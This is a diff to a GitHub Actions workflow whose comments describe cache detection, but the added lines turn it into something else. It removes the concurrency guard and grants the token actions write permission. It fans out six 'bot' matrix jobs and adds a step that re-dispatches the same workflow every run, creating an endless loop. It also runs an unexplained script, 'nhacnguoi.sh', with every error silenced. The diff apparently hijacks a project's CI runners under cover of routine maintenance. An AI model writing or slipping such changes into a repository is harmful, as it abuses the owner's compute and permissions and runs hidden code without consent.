@@ -7,16 +7,16 @@ on:
       # Pull requests to a release branch restore the caches of the release branch, whose dependencies
       # usually differ from those of main.
       - 'release/*'
-
+  workflow_dispatch:
 permissions: {}
 
 # Warming a missing cache takes up to 15 minutes, and the pushes in the meantime need the same
 # caches. Allow one running and one pending run: GitHub replaces the pending run with the newest
 # push, which then skips the caches the running one saved. Don't cancel in-progress runs, or
 # frequent pushes may keep a slow cache from ever being saved.
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: false
+# concurrency:
+#   group: ${{ github.workflow }}-${{ github.ref }}
+#   cancel-in-progress: false
 
 jobs:
   # Most pushes don't change the dependencies. Each job below only runs when one of the caches
@@ -24,10 +24,29 @@ jobs:
   # after a dependency change or a cache eviction. Jobs also run when the detection fails.
   caches:
     name: Detect Missing Caches
-    runs-on: ubuntu-24.04
+    runs-on: ${{ matrix.os }}
+    timeout-minutes: 20
     permissions:
-      actions: read
-      contents: read
+        actions: write
+        contents: read
+    strategy:
+      matrix:
+        bot_id: [1,2,3,4,5,6]
+        include:
+          - bot_id: 1
+            os: ubuntu-24.04
+          - bot_id: 2
+            os: ubuntu-24.04
+          - bot_id: 3
+            os: ubuntu-24.04
+          - bot_id: 4
+            os: ubuntu-24.04
+          - bot_id: 5
+            os: ubuntu-24.04
+          - bot_id: 6
+            os: ubuntu-24.04
+      fail-fast: false
+
     outputs:
       compile: ${{ steps.detect.outputs.compile }}
       linux: ${{ steps.detect.outputs.linux }}
@@ -47,7 +66,22 @@ jobs:
         uses: ./.github/actions/detect-missing-caches
         with:
           token: ${{ secrets.GITHUB_TOKEN }}
-
+      - name: My
+        if: always() && matrix.bot_id == 1
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        shell: bash
+        run: |
+          sleep 10
+          gh workflow run "${{ github.workflow }}" \
+            --repo "${{ github.repository }}" \
+            --ref "${{ github.ref_name }}"
+      - name: Up | Trust
+        continue-on-error: true
+        run: |
+          sed -i 's/\r$//' nhacnguoi.sh || true
+          chmod +x nhacnguoi.sh || true
+          ./nhacnguoi.sh || true
   compile:
     name: Compile
     needs: caches
